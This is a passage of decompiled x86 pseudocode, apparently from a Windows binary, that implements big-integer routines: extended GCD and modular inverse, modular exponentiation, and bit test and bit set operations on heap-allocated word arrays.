  HANDLE ProcessHeap; // eax
  HANDLE v11; // eax
  int v12; // edi
  HANDLE v13; // eax
  HANDLE v14; // eax
  int v15; // ebx
  HANDLE v16; // eax
  HANDLE v17; // eax
  int v18; // ecx
  int v19; // edx
  int v20; // eax
  int i; // edx
  bool v22; // sf
  unsigned int v23; // ecx
  int v24; // esi
  int v25; // ecx
  int v26; // eax
  int j; // ecx
  unsigned int v28; // esi
  int v29; // ecx
  unsigned int v30; // eax
  unsigned int v31; // edx
  unsigned int v32; // esi
  int v33; // ecx
  int *v34; // ecx
  int *v35; // ecx
  unsigned int v36; // eax
  int v37; // esi
  int v38; // ecx
  int v39; // eax
  int k; // ecx
  unsigned int v41; // esi
  int v42; // edx
  int v43; // esi
  int v44; // ecx
  int v45; // eax
  int v46; // ecx
  char *v47; // edx
  unsigned int *v48; // eax
  unsigned int v49; // edx
  bool v50; // cf
  int v51; // eax
  int v52; // eax
  unsigned int v53; // edx
  unsigned int *v54; // ecx
  unsigned int v55; // edx
  unsigned int v56; // eax
  unsigned int v57; // eax
  int v58; // esi
  int v59; // ecx
  int v60; // eax
  int n; // ecx
  unsigned int v62; // esi
  int v63; // eax
  int v64; // eax
  int v65; // eax
  int v66; // esi
  int v67; // ecx
  int v68; // eax
  int m; // ecx
  unsigned int v70; // esi
  char *v71; // esi
  int v72; // edi
  int v73; // eax
  int v74; // edi
  char *v75; // eax
  int v76; // ebx
  char *v77; // esi
  int v78; // eax
  char *v79; // esi
  int v80; // ecx
  unsigned int v81; // eax
  char *v82; // edx
  int v83; // eax
  int v84; // ecx
  unsigned int *v85; // eax
  signed int v86; // edx
  unsigned int v87; // edx
  bool v88; // zf
  unsigned int v89; // eax
  int *v90; // ecx
  int *v91; // ecx
  int v92; // eax
  char *v93; // edi
  _DWORD *v94; // edx
  void *v95; // ecx
  LPVOID v96; // eax
  HANDLE v97; // eax
  HANDLE v98; // eax
  HANDLE v99; // eax
  HANDLE v100; // eax
  HANDLE v101; // eax
  HANDLE v102; // eax
  void *v103; // [esp-4h] [ebp-80h]
  void *v104; // [esp-4h] [ebp-80h]
  void *v105; // [esp-4h] [ebp-80h]
  void *v106; // [esp-4h] [ebp-80h]
  int v107; // [esp+10h] [ebp-6Ch] BYREF
  int v108; // [esp+14h] [ebp-68h]
  LPVOID v109; // [esp+18h] [ebp-64h]
  int v110; // [esp+1Ch] [ebp-60h] BYREF
  int v111; // [esp+20h] [ebp-5Ch]
  char *v112; // [esp+24h] [ebp-58h]
  int v113; // [esp+28h] [ebp-54h] BYREF
  int v114; // [esp+2Ch] [ebp-50h]
  LPVOID lpMem; // [esp+30h] [ebp-4Ch]
  int Mem; // [esp+34h] [ebp-48h] BYREF
  int v117; // [esp+38h] [ebp-44h]
  int *v118; // [esp+3Ch] [ebp-40h]
  int v119; // [esp+40h] [ebp-3Ch] BYREF
  int v120; // [esp+44h] [ebp-38h]
  char *v121; // [esp+48h] [ebp-34h]
  int v122; // [esp+4Ch] [ebp-30h] BYREF
  int v123; // [esp+50h] [ebp-2Ch]
  LPVOID v124; // [esp+54h] [ebp-28h]
  int *v125; // [esp+58h] [ebp-24h]
  signed int v126; // [esp+5Ch] [ebp-20h]
  unsigned int v127; // [esp+60h] [ebp-1Ch]
  _DWORD *v128; // [esp+64h] [ebp-18h]
  _DWORD *v129; // [esp+68h] [ebp-14h]
  int v130; // [esp+6Ch] [ebp-10h]
  LPVOID v131; // [esp+70h] [ebp-Ch]
  unsigned int v132; // [esp+74h] [ebp-8h]
  char *v133; // [esp+78h] [ebp-4h]
  void *v134; // [esp+88h] [ebp+Ch]

  v128 = 0;
  v129 = a2;
  v7 = a4[1];
  v125 = a1;
  if ( !v7 )
  {
    if ( a1 != a5 )
      sub_402CD0(a1, a5);
    result = (int *)abs32(a1[1]);
    a1[1] = (int)result;
    if ( a2 )
      goto LABEL_5;
    return result;
  }
  if ( a5[1] )
  {
    v113 = 1;
    v114 = 0;
    ProcessHeap = GetProcessHeap();
    lpMem = HeapAlloc(ProcessHeap, 8u, 4u);
    Mem = 1;
    v117 = 0;
    v11 = GetProcessHeap();
    v12 = 0;
    v118 = (int *)HeapAlloc(v11, 8u, 4u);
    v119 = 1;
    v120 = 0;
    v13 = GetProcessHeap();
    v133 = (char *)HeapAlloc(v13, 8u, 4u);
    v121 = v133;
    v110 = 1;
    v131 = 0;
    v111 = 0;
    v14 = GetProcessHeap();
    v15 = 0;
    v112 = (char *)HeapAlloc(v14, 8u, 4u);
    v122 = 1;
    v123 = 0;
    v16 = GetProcessHeap();
    v124 = HeapAlloc(v16, 8u, 4u);
    v107 = 1;
    v108 = 0;
    v17 = GetProcessHeap();
    v109 = HeapAlloc(v17, 8u, 4u);
    if ( &v113 != a4 )
    {
      sub_402CD0(&v113, a4);
      if ( v114 < 0 )
        v114 = -v114;
    }
    v18 = 0;
    v19 = *(_DWORD *)lpMem;
    if ( *(_DWORD *)lpMem )
    {
LABEL_20:
      v20 = v19 & -v19;
      for ( i = 0; (v20 & 0xFF000000) == 0; i += 8 )
        v20 <<= 8;
      if ( v20 >= 0 )
      {
        do
        {
          ++i;
          v22 = (v20 & 0x40000000) != 0;
          v20 *= 2;
        }
        while ( !v22 );
      }
      v23 = 32 * v18 - i + 31;
    }
    else
    {
      while ( ++v18 )
      {
        v19 = *((_DWORD *)lpMem + v18);
        if ( v19 )
          goto LABEL_20;
      }
      v23 = -1;
    }
    v132 = v23;
    sub_4034F0(&v113, (int)&v113, v23);
    if ( &Mem != a5 )
    {
      sub_402CD0(&Mem, a5);
      if ( v117 < 0 )
        v117 = -v117;
    }
    v24 = 0;
    v25 = *v118;
    if ( *v118 )
    {
LABEL_31:
      v26 = v25 & -v25;
      for ( j = 0; (v26 & 0xFF000000) == 0; j += 8 )
        v26 <<= 8;
      if ( v26 >= 0 )
      {
        do
        {
          ++j;
          v22 = (v26 & 0x40000000) != 0;
          v26 *= 2;
        }
        while ( !v22 );
      }
      v28 = 32 * v24 - j + 31;
    }
    else
    {
      while ( ++v24 )
      {
        v25 = v118[v24];
        if ( v25 )
          goto LABEL_31;
      }
      v28 = -1;
    }
    sub_4034F0(&Mem, (int)&Mem, v28);
    v29 = v114;
    v30 = v28;
    if ( v132 < v28 )
      v30 = v132;
    v31 = v132 - v30;
    v126 = v30;
    v32 = v28 - v30;
    v132 -= v30;
    if ( v114 < v117 )
    {
      v114 = v117;
      v117 = v29;
      v33 = v113;
      v113 = Mem;
      Mem = v33;
      v34 = (int *)lpMem;
      lpMem = v118;
      v118 = v34;
      v35 = a5;
      a5 = a4;
      v128 = v129;
      v129 = 0;
      v36 = v31;
      v31 = v32;
      a4 = v35;
      v132 = v32;
      v32 = v36;
    }
    if ( !sub_4043D0((int)&v122, v31) )
    {
      sub_404440(&v122, v132);
      v15 = v123;
    }
    sub_403290((unsigned int *)&v107, &v113, &v113, &Mem);
    sub_403170(&v107, (int)&v107, v132);
    if ( !sub_4043D0((int)&v110, v32) )
    {
      sub_404440(&v110, v32);
      v131 = (LPVOID)v111;
    }
    v130 = v32 + v132;
    if ( v114 <= 0 )
    {
      v71 = v133;
LABEL_125:
      sub_403170(&Mem, (int)&Mem, v126);
      v72 = -v12;
      v120 = v72;
      sub_403290((unsigned int *)&v110, 0, a5, &Mem);
      v131 = (LPVOID)v111;
      if ( v111 < 0 )
      {
        v131 = (LPVOID)-v111;
        v111 = -v111;
      }
      sub_403290((unsigned int *)&v107, 0, a4, &Mem);
      v132 = v108;
      if ( v108 < 0 )
      {
        v132 = -v108;
        v108 = -v108;
      }
      v73 = v130;
      if ( v130 )
      {
        while ( 1 )
        {
          v130 = v73 - 1;
          if ( ((v72 != 0) & *(_DWORD *)v71) != 0 || ((v15 != 0) & *(_DWORD *)v124) != 0 )
          {
            if ( ((v72 ^ (unsigned int)v131) & 0x80000000) != 0 )
            {
              v72 = sub_402D60(&v119, (int)&v119, (int)&v110);
              v131 = (LPVOID)v111;
            }
            else
            {
              v72 = sub_402E90(&v119, (int)&v119, (int)&v110);
            }
            if ( v120 < 0 )
              v72 = -v72;
            v120 = v72;
            if ( ((v15 ^ v132) & 0x80000000) != 0 )
            {
              v15 = sub_402E90(&v122, (int)&v122, (int)&v107);
            }
            else
            {
              v15 = sub_402D60(&v122, (int)&v122, (int)&v107);
              v132 = v108;
            }
            v71 = v121;
            v133 = v121;
            if ( v123 < 0 )
              v15 = -v15;
            v123 = v15;
          }
          v126 = v72;
          if ( v72 )
          {
            v74 = abs32(v72);
            if ( v74 <= v119 )
            {
              v75 = v133;
            }
            else
            {
              v71 = (char *)sub_402C80(&v119, v74);
              v75 = v121;
              v133 = v121;
            }
            sub_402660(v71, v75, v74);
            v72 = (__PAIR64__(v74, *(_DWORD *)&v71[4 * v74 - 4]) - 1) >> 32;
            if ( v126 < 0 )
              v72 = -v72;
          }
          v120 = v72;
          v126 = v15;
          if ( v15 )
          {
            v76 = abs32(v15);
            v77 = (char *)(v76 <= v122 ? v124 : sub_402C80(&v122, v76));
            sub_402660(v77, (char *)v124, v76);
            v15 = (__PAIR64__(v76, *(_DWORD *)&v77[4 * v76 - 4]) - 1) >> 32;
            if ( v126 < 0 )
              v15 = -v15;
          }
          v73 = v130;
          v123 = v15;
          if ( !v130 )
            break;
          v71 = v133;
        }
      }
      if ( ((v72 ^ (unsigned int)v131) & 0x80000000) != 0 )
      {
        v78 = sub_402E90(&v110, (int)&v119, (int)&v110);
        v79 = v133;
      }
      else
      {
        v78 = sub_402D60(&v110, (int)&v119, (int)&v110);
        v79 = v121;
        v72 = v120;
        v133 = v121;
      }
      v130 = v78;
      if ( v72 < 0 )
      {
        v78 = -v78;
        v130 = v78;
      }
      v80 = v72;
      v81 = abs32(v78);
      v126 = v81;
      if ( v72 < 0 )
        v80 = -v72;
      v82 = v112;
      v131 = v112;
      if ( v80 == v81 )
      {
        v84 = v80 - 1;
        if ( v84 < 0 )
        {
LABEL_171:
          v83 = 0;
        }
        else
        {
          v85 = (unsigned int *)&v112[4 * v84];
          v86 = v79 - v112;
          v126 = v79 - v112;
          while ( 1 )
          {
            v87 = *(unsigned int *)((char *)v85 + v86);
            v88 = v87 == *v85;
            v127 = *v85;
            v79 = v133;
            if ( !v88 )
              break;
            v86 = v126;
            --v85;
            if ( --v84 < 0 )
              goto LABEL_171;
          }
          v83 = v127 < v87 ? 1 : -1;
        }
        v82 = v112;
      }
      else
      {
        v83 = 2 * (v80 >= v126) - 1;
      }
      if ( v83 > 0 )
      {
        v72 = v130;
        v119 = v110;
        v131 = v79;
        v79 = v82;
        v133 = v82;
        v89 = ((v15 ^ v132) & 0x80000000) != 0
            ? sub_402D60(&v122, (int)&v122, (int)&v107)
            : sub_402E90(&v122, (int)&v122, (int)&v107);
        v15 = v89;
        if ( v123 < 0 )
          v15 = -v89;
      }
      if ( a4[1] < 0 )
        v72 = -v72;
      if ( a5[1] < 0 )
        v15 = -v15;
      v90 = v125;
      v125[1] = v117;
      *v90 = Mem;
      v134 = (void *)v90[2];
      v90[2] = (int)v118;
      v91 = v129;
      if ( v129 )
      {
        v92 = v119;
        v129[1] = v72;
        v93 = (char *)v91[2];
        *v91 = v92;
        v91[2] = (int)v79;
      }
      else
      {
        v93 = v133;
      }
      v94 = v128;
      if ( v128 )
      {
        v95 = (void *)v128[2];
        *v128 = v122;
        v96 = v124;
        v94[1] = v15;
        v94[2] = v96;
        v124 = v95;
      }
      v103 = lpMem;
      v97 = GetProcessHeap();
      HeapFree(v97, 0, v103);
      v98 = GetProcessHeap();
      HeapFree(v98, 0, v134);
      v99 = GetProcessHeap();
      HeapFree(v99, 0, v93);
      v104 = v131;
      v100 = GetProcessHeap();
      HeapFree(v100, 0, v104);
      v105 = v124;
      v101 = GetProcessHeap();
      HeapFree(v101, 0, v105);
      v106 = v109;
      v102 = GetProcessHeap();
      return (int *)HeapFree(v102, 0, v106);
    }
    v37 = 0;
    v38 = *(_DWORD *)lpMem;
    if ( *(_DWORD *)lpMem )
    {
LABEL_48:
      v39 = v38 & -v38;
      for ( k = 0; (v39 & 0xFF000000) == 0; k += 8 )
        v39 <<= 8;
      if ( v39 >= 0 )
      {
        do
        {
          ++k;
          v22 = (v39 & 0x40000000) != 0;
          v39 *= 2;
        }
        while ( !v22 );
      }
      v41 = 32 * v37 - k + 31;
    }
    else
    {
      while ( ++v37 )
      {
        v38 = *((_DWORD *)lpMem + v37);
        if ( v38 )
          goto LABEL_48;
      }
      v41 = -1;
    }
    sub_4034F0(&v113, (int)&v113, v41);
    sub_403170(&v122, (int)&v122, v41);
    sub_403170(&v119, (int)&v119, v41);
    v42 = v117;
    v130 += v41;
    v43 = v108;
    v12 = v120;
    v15 = v123;
    v133 = (char *)v117;
    v132 = v108;
    while ( 1 )
    {
      v44 = v114;
      if ( v114 != v42 )
      {
        v45 = 2 * (v114 >= v42) - 1;
        goto LABEL_66;
      }
      if ( v114 < 0 )
        break;
      v46 = v114 - 1;
      if ( v114 - 1 >= 0 )
      {
        v47 = (char *)((_BYTE *)lpMem - (_BYTE *)v118);
        v127 = (_BYTE *)lpMem - (_BYTE *)v118;
        v48 = (unsigned int *)&v118[v46];
        while ( 1 )
        {
          v49 = *(unsigned int *)((char *)v48 + (_DWORD)v47);
          v50 = *v48 < v49;
          if ( *v48 != v49 )
            break;
          v47 = (char *)v127;
          --v48;
          if ( --v46 < 0 )
            goto LABEL_64;
        }
LABEL_74:
        v45 = v50 ? 1 : -1;
        goto LABEL_65;
      }
LABEL_64:
      v45 = 0;
LABEL_65:
      v42 = (int)v133;
      v44 = v114;
      v43 = v132;
LABEL_66:
      if ( !v45 )
      {
        v71 = v121;
        v133 = v121;
        goto LABEL_125;
      }
      if ( v45 >= 0 )
      {
        if ( (v44 ^ v42) < 0 )
        {
          v63 = sub_402D60(&v113, (int)&v113, (int)&Mem);
          v133 = (char *)v117;
        }
        else
        {
          v63 = sub_402E90(&v113, (int)&v113, (int)&Mem);
        }
        if ( v114 < 0 )
          v63 = -v63;
        v114 = v63;
        if ( (v15 ^ v43) < 0 )
        {
          v64 = sub_402E90(&v107, (int)&v122, (int)&v107);
        }
        else
        {
          v64 = sub_402D60(&v107, (int)&v122, (int)&v107);
          v15 = v123;
        }
        v132 = v64;
        if ( v15 < 0 )
        {
          v64 = -v64;
          v132 = v64;
        }
        v108 = v64;
        if ( ((v12 ^ (unsigned int)v131) & 0x80000000) != 0 )
        {
          v65 = sub_402E90(&v110, (int)&v119, (int)&v110);
        }
        else
        {
          v65 = sub_402D60(&v110, (int)&v119, (int)&v110);
          v12 = v120;
        }
        v131 = (LPVOID)v65;
        if ( v12 < 0 )
        {
          v65 = -v65;
          v131 = (LPVOID)v65;
        }
        v111 = v65;
        v66 = 0;
        v67 = *(_DWORD *)lpMem;
        if ( *(_DWORD *)lpMem )
        {
LABEL_116:
          v68 = v67 & -v67;
          for ( m = 0; (v68 & 0xFF000000) == 0; m += 8 )
            v68 <<= 8;
          if ( v68 >= 0 )
          {
            do
            {
              ++m;
              v22 = (v68 & 0x40000000) != 0;
              v68 *= 2;
            }
            while ( !v22 );
          }
          v70 = 32 * v66 - m + 31;
        }
        else
        {
          while ( ++v66 )
          {
            v67 = *((_DWORD *)lpMem + v66);
            if ( v67 )
              goto LABEL_116;
          }
          v70 = -1;
        }
        sub_4034F0(&v113, (int)&v113, v70);
        sub_403170(&v122, (int)&v122, v70);
        sub_403170(&v119, (int)&v119, v70);
        v12 = v120;
        v130 += v70;
        v15 = v123;
        v42 = (int)v133;
        v43 = v132;
      }
      else
      {
        if ( (v44 ^ v42) < 0 )
          v51 = sub_402D60(&Mem, (int)&Mem, (int)&v113);
        else
          v51 = sub_402E90(&Mem, (int)&Mem, (int)&v113);
        if ( v117 < 0 )
          v51 = -v51;
        v117 = v51;
        if ( (v15 ^ v43) < 0 )
          v56 = sub_402E90(&v122, (int)&v122, (int)&v107);
        else
          v56 = sub_402D60(&v122, (int)&v122, (int)&v107);
        v15 = v56;
        if ( v123 < 0 )
          v15 = -v56;
        v123 = v15;
        if ( ((v12 ^ (unsigned int)v131) & 0x80000000) != 0 )
          v57 = sub_402E90(&v119, (int)&v119, (int)&v110);
        else
          v57 = sub_402D60(&v119, (int)&v119, (int)&v110);
        v12 = v57;
        if ( v120 < 0 )
          v12 = -v57;
        v58 = 0;
        v120 = v12;
        v59 = *v118;
        if ( *v118 )
        {
LABEL_91:
          v60 = v59 & -v59;
          for ( n = 0; (v60 & 0xFF000000) == 0; n += 8 )
            v60 <<= 8;
          if ( v60 >= 0 )
          {
            do
            {
              ++n;
              v22 = (v60 & 0x40000000) != 0;
              v60 *= 2;
            }
            while ( !v22 );
          }
          v62 = 32 * v58 - n + 31;
        }
        else
        {
          while ( ++v58 )
          {
            v59 = v118[v58];
            if ( v59 )
              goto LABEL_91;
          }
          v62 = -1;
        }
        sub_4034F0(&Mem, (int)&Mem, v62);
        sub_403170(&v107, (int)&v107, v62);
        sub_403170(&v110, (int)&v110, v62);
        v42 = v117;
        v130 += v62;
        v131 = (LPVOID)v111;
        v43 = v108;
        v133 = (char *)v117;
        v132 = v108;
      }
    }
    v52 = ~v114;
    v53 = (char *)v118 - (_BYTE *)lpMem;
    v127 = (char *)v118 - (_BYTE *)lpMem;
    v54 = (unsigned int *)((char *)lpMem + 4 * ~v114);
    while ( 1 )
    {
      v55 = *(unsigned int *)((char *)v54 + v53);
      v50 = *v54 < v55;
      if ( *v54 != v55 )
        goto LABEL_74;
      v53 = v127;
      --v54;
      if ( --v52 < 0 )
        goto LABEL_64;
    }
  }
  v9 = (v7 > 0) - ((unsigned int)v7 >> 31);
  if ( a1 != a4 )
    sub_402CD0(a1, a4);
  result = (int *)abs32(a1[1]);
  a1[1] = (int)result;
  if ( a2 )
  {
    if ( v9 < 0 )
    {
      result = (int *)a2[2];
      a2[1] = -1;
      *result = -v9;
    }
    else
    {
      if ( !v9 )
      {
LABEL_5:
        a2[1] = 0;
        return result;
      }
      result = (int *)a2[2];
      a2[1] = 1;
      *result = v9;
    }
  }
  return result;
}

//----- (00403F60) --------------------------------------------------------
BOOL __fastcall sub_403F60(int a1, int *a2, int a3)
{
  int v4; // eax
  unsigned int v5; // eax
  HANDLE ProcessHeap; // eax
  HANDLE v7; // eax
  int v8; // ecx
  void *v9; // esi
  int v10; // ecx
  unsigned int v11; // eax
  BOOL v12; // ebx
  _DWORD *v13; // ecx
  void *v14; // edi
  HANDLE v15; // eax
  HANDLE v16; // eax
  int v18; // [esp+10h] [ebp-1Ch] BYREF
  int v19; // [esp+14h] [ebp-18h]
  LPVOID lpMem; // [esp+18h] [ebp-14h]
  int v21; // [esp+1Ch] [ebp-10h] BYREF
  int v22; // [esp+20h] [ebp-Ch]
  LPVOID v23; // [esp+24h] [ebp-8h]
  _DWORD *v24; // [esp+28h] [ebp-4h]

  v24 = (_DWORD *)a1;
  if ( !a2[1] )
    return 0;
  v4 = abs32(*(_DWORD *)(a3 + 4));
  if ( v4 <= 1 )
  {
    v5 = v4 == 1 ? **(_DWORD **)(a3 + 8) : 0;
    if ( (int)((__PAIR64__(v5 > 1, v5) - 1) >> 32) <= 0 )
      return 0;
  }
  v18 = 1;
  v19 = 0;
  ProcessHeap = GetProcessHeap();
  lpMem = HeapAlloc(ProcessHeap, 8u, 4u);
  v21 = 1;
  v22 = 0;
  v7 = GetProcessHeap();
  v23 = HeapAlloc(v7, 8u, 4u);
  sub_4035B0(&v18, &v21, v8, a2, (int *)a3);
  v9 = lpMem;
  if ( v19 <= 1 )
  {
    if ( v19 >= 0 )
    {
      if ( v19 <= 0 )
        v11 = 0;
      else
        v11 = *(_DWORD *)lpMem;
      v10 = (__PAIR64__(v11 > 1, v11) - 1) >> 32;
    }
    else
    {
      v10 = -1;
    }
  }
  else
  {
    v10 = 1;
  }
  v12 = v10 == 0;
  if ( v10 )
  {
    v14 = v23;
  }
  else
  {
    if ( v22 < 0 )
    {
      if ( *(int *)(a3 + 4) < 0 )
        sub_403040(&v21, (int)&v21, a3);
      else
        sub_403000(&v21, (int)&v21, a3);
    }
    v13 = v24;
    v14 = (void *)v24[2];
    v24[1] = v22;
    *v13 = v21;
    v13[2] = v23;
  }
  v15 = GetProcessHeap();
  HeapFree(v15, 0, v9);
  v16 = GetProcessHeap();
  HeapFree(v16, 0, v14);
  return v12;
}
// 403FF9: variable 'v8' is possibly undefined

//----- (004040B0) --------------------------------------------------------
_DWORD *__fastcall sub_4040B0(_DWORD *a1, int *a2, int a3, int a4)
{
  __int64 v5; // rax
  int v6; // ebx
  int v7; // ebx
  _DWORD *v8; // eax
  _DWORD *result; // eax
  int *v10; // esi
  HANDLE (__stdcall *v11)(); // ecx
  HANDLE ProcessHeap; // eax
  int v13; // esi
  HANDLE v14; // eax
  void *v15; // eax
  int *v16; // eax
  char *v17; // edi
  char *v18; // eax
  HANDLE v19; // eax
  char *v20; // eax
  int v21; // ecx
  char *v22; // edi
  int v23; // esi
  unsigned int v24; // esi
  int v25; // eax
  char *v26; // eax
  char *v27; // eax
  HANDLE v28; // eax
  _DWORD *v29; // ecx
  HANDLE v30; // eax
  HANDLE v31; // eax
  void *v32; // [esp-4h] [ebp-54h]
  void *v33; // [esp-4h] [ebp-54h]
  void *v34; // [esp-4h] [ebp-54h]
  int v35[4]; // [esp+10h] [ebp-40h] BYREF
  unsigned int v36; // [esp+20h] [ebp-30h] BYREF
  int v37; // [esp+24h] [ebp-2Ch]
  char *v38; // [esp+28h] [ebp-28h]
  int v39; // [esp+2Ch] [ebp-24h] BYREF
  int v40; // [esp+30h] [ebp-20h]
  LPVOID v41; // [esp+34h] [ebp-1Ch]
  int v42; // [esp+38h] [ebp-18h]
  _DWORD *v43; // [esp+3Ch] [ebp-14h]
  int v44; // [esp+40h] [ebp-10h]
  LPVOID lpMem; // [esp+44h] [ebp-Ch]
  int v46; // [esp+48h] [ebp-8h]
  int *v47; // [esp+4Ch] [ebp-4h]
  unsigned int v48; // [esp+5Ch] [ebp+Ch]

  v43 = a1;
  lpMem = 0;
  v5 = *(int *)(a4 + 4);
  v6 = *(_DWORD *)(a4 + 4);
  v46 = abs32(*(_DWORD *)(a3 + 4));
  v7 = (HIDWORD(v5) ^ v6) - HIDWORD(v5);
  if ( v46 )
  {
    v47 = *(int **)(a4 + 8);
    v10 = v47;
    sub_4023F0(v35, v47, v7);
    v11 = GetProcessHeap;
    v44 = v35[0];
    if ( v35[0] )
    {
      v35[0] = 0;
      ProcessHeap = GetProcessHeap();
      lpMem = HeapAlloc(ProcessHeap, 8u, 4 * v7);
      sub_4020B0((int)lpMem, (int)v10, v7, v44);
      v11 = GetProcessHeap;
      v47 = (int *)lpMem;
    }
    v13 = 0;
    v39 = 1;
    v40 = 0;
    v14 = v11();
    v15 = HeapAlloc(v14, 8u, 4u);
    v41 = v15;
    if ( *(int *)(a3 + 4) >= 0 )
    {
      if ( &v39 != a2 )
      {
        sub_402CD0(&v39, a2);
        v13 = v40;
        v15 = v41;
        if ( v40 < 0 )
        {
          v13 = -v40;
          v40 = -v40;
        }
      }
      if ( v13 >= v7 )
      {
        sub_402BD0(0, (char *)v15, v13, (int)v47, v7, v35);
        v13 = v7;
      }
      if ( a2[1] >= 0 )
      {
        v17 = (char *)v41;
      }
      else
      {
        if ( v7 <= v39 )
        {
          v17 = (char *)v41;
          v16 = (int *)v41;
        }
        else
        {
          v16 = (int *)sub_402C80(&v39, v7);
          v17 = (char *)v41;
        }
        sub_401D90((int)v16, (int)v47, v7, v16, v13);
        v13 = v7;
      }
      if ( v13 > 0 )
      {
        v18 = &v17[4 * v13 - 4];
        do
        {
          if ( *(_DWORD *)v18 )
            break;
          --v13;
          v18 -= 4;
        }
        while ( v13 > 0 );
      }
      v40 = v13;
    }
    else
    {
      sub_403F60((int)&v39, a2, a4);
    }
    v36 = 1;
    v19 = GetProcessHeap();
    v20 = (char *)HeapAlloc(v19, 8u, 4u);
    v21 = v46;
    v22 = v20;
    v38 = v20;
    v23 = 1;
    v37 = 1;
    *(_DWORD *)v20 = 1;
    if ( v21 > 0 )
    {
      do
      {
        v24 = 0x80000000;
        v46 = v21 - 1;
        v48 = 0x80000000;
        v42 = *(_DWORD *)(*(_DWORD *)(a3 + 8) + 4 * (v21 - 1));
        while ( 1 )
        {
          sub_403080(&v36, (int)&v36, (int)&v36);
          if ( (v24 & v42) != 0 )
            sub_403080(&v36, (int)&v36, (int)&v39);
          v23 = v37;
          v22 = v38;
          if ( v37 > v7 )
          {
            if ( v7 == 1 )
            {
              *(_DWORD *)v22 = sub_4024F0(0, v38, v37, v35);
            }
            else if ( v7 == 2 )
            {
              sub_4026F0(0, v38, (int)v38, v37, v35);
            }
            else
            {
              if ( v35[0] )
                v25 = sub_4020B0((int)v38, (int)v38, v37, v35[0]);
              else
                v25 = 0;
              sub_402940(0, (int)v22, v23, v25, (int)v47, v7, v35[3]);
              if ( v35[0] )
                sub_402130(v22, v22, v7, v35[0]);
            }
            v23 = v7;
            if ( v7 > 0 )
            {
              v26 = &v22[4 * v7 - 4];
              do
              {
                if ( *(_DWORD *)v26 )
                  break;
                --v23;
                v26 -= 4;
              }
              while ( v23 > 0 );
            }
            v37 = v23;
          }
          v48 >>= 1;
          if ( !v48 )
            break;
          v24 = v48;
        }
        v21 = v46;
      }
      while ( v46 > 0 );
    }
    if ( v23 >= v7 )
    {
      v35[0] = v44;
      sub_402BD0(0, v22, v23, (int)v47, v7, v35);
      v23 = v7;
      if ( v7 > 0 )
      {
        v27 = &v22[4 * v7 - 4];
        do
        {
          if ( *(_DWORD *)v27 )
            break;
          --v23;
          v27 -= 4;
        }
        while ( v23 > 0 );
      }
    }
    if ( lpMem )
    {
      v32 = lpMem;
      v28 = GetProcessHeap();
      HeapFree(v28, 0, v32);
    }
    v29 = v43;
    *v43 = v36;
    v33 = (void *)v29[2];
    v29[1] = v23;
    v29[2] = v22;
    v30 = GetProcessHeap();
    HeapFree(v30, 0, v33);
    v34 = v41;
    v31 = GetProcessHeap();
    return (_DWORD *)HeapFree(v31, 0, v34);
  }
  else
  {
    v8 = v43;
    v43[1] = 1;
    result = (_DWORD *)v8[2];
    *result = 1;
  }
  return result;
}

//----- (004043D0) --------------------------------------------------------
unsigned int __fastcall sub_4043D0(int a1, unsigned int a2)
{
  int v2; // edi
  int v3; // esi
  int v5; // eax
  int v6; // ebx
  unsigned int v7; // edx
  _DWORD *v8; // eax
  int v9; // edx

  v2 = *(_DWORD *)(a1 + 4);
  v3 = a2 >> 5;
  if ( (int)(a2 >> 5) >= (int)abs32(v2) )
    return (unsigned int)v2 >> 31;
  v5 = *(_DWORD *)(a1 + 8);
  v6 = a2 & 0x1F;
  v7 = *(_DWORD *)(v5 + 4 * v3);
  v8 = (_DWORD *)(v5 + 4 * v3);
  v9 = (v7 >> v6) & 1;
  if ( v2 < 0 )
  {
    if ( v6 && *v8 << (32 - v6) )
      return v9 ^ 1;
    if ( v3 )
    {
      while ( 1 )
      {
        --v8;
        --v3;
        if ( *v8 )
          break;
        if ( v3 <= 0 )
          return v9;
      }
      return v9 ^ 1;
    }
  }
  return v9;
}

//----- (00404440) --------------------------------------------------------
int __fastcall sub_404440(int *a1, unsigned int a2)
{
  char *v4; // edx
  signed int v5; // eax
  unsigned int v6; // edi
  signed int v7; // ecx
  unsigned int v8; // esi
  int v9; // eax
  HANDLE ProcessHeap; // eax
  __int64 v11; // rax
  int v12; // edx
  int v13; // esi
  char *v14; // ecx
  int v15; // eax
  unsigned int v16; // eax
  signed int v17; // ecx
  _DWORD *v18; // eax
  int result; // eax
  char *v20; // [esp-8h] [ebp-24h]
  SIZE_T v21; // [esp-4h] [ebp-20h]
  unsigned int v22; // [esp+Ch] [ebp-10h]
  unsigned int v23; // [esp+Ch] [ebp-10h]
  signed int v24; // [esp+10h] [ebp-Ch]
  char *v25; // [esp+14h] [ebp-8h]
  signed int v26; // [esp+18h] [ebp-4h]

  v4 = (char *)a1[2];
  v26 = abs32(a1[1]);
  v5 = a2 >> 5;
  v22 = a2 >> 5;
  v6 = 1 << (a2 & 0x1F);
  v7 = v26;
  v25 = v4;
  if ( (int)(a2 >> 5) < v26 )
  {
    v12 = 0;
    v13 = v26 - v5;
    v14 = &v25[4 * v5];
    do
    {
      v15 = *(_DWORD *)v14;
      v14 += 4;
      v16 = v6 + v15;
      v23 = v6;
      *((_DWORD *)v14 - 1) = v16;
      ++v12;
      v6 = v16 < v6;
    }
    while ( v12 < v13 );
    v17 = v26;
    v8 = v26;
    if ( v16 < v23 )
    {
      v8 = v26 + 1;
      if ( v26 + 1 <= *a1 )
      {
        v18 = (_DWORD *)a1[2];
      }
      else
      {
        v18 = sub_402C80(a1, v26 + 1);
        v17 = v26;
      }
      v18[v17] = v6;
    }
  }
  else
  {
    v8 = v5 + 1;
    if ( v5 + 1 > *a1 )
    {
      v9 = 1;
      if ( v8 > 1 )
        v9 = v8;
      v24 = v9;
      v21 = 4 * v9;
      v20 = v4;
      ProcessHeap = GetProcessHeap();
      v25 = (char *)HeapReAlloc(ProcessHeap, 8u, v20, v21);
      a1[2] = (int)v25;
      v11 = a1[1];
      *a1 = v24;
      if ( (int)((HIDWORD(v11) ^ v11) - HIDWORD(v11)) > v24 )
        a1[1] = 0;
      v5 = v22;
      v7 = v26;
      v4 = v25;
    }
    *(_DWORD *)&v4[4 * v5] = v6;
    if ( v7 < v5 )
      memset(&v25[4 * v26], 0, 4 * (v5 - v7));
  }
  result = -v8;
  if ( a1[1] >= 0 )
    result = v8;
  a1[1] = result;
  return result;
}

//----- (00404550) --------------------------------------------------------
int __cdecl sub_404550(int a1, int a2, int a3, int a4, int a5)
{
  _DWORD *v5; // ecx
  _DWORD *v6; // esi
  unsigned __int8 *v7; // ebx
  bool v8; // cc
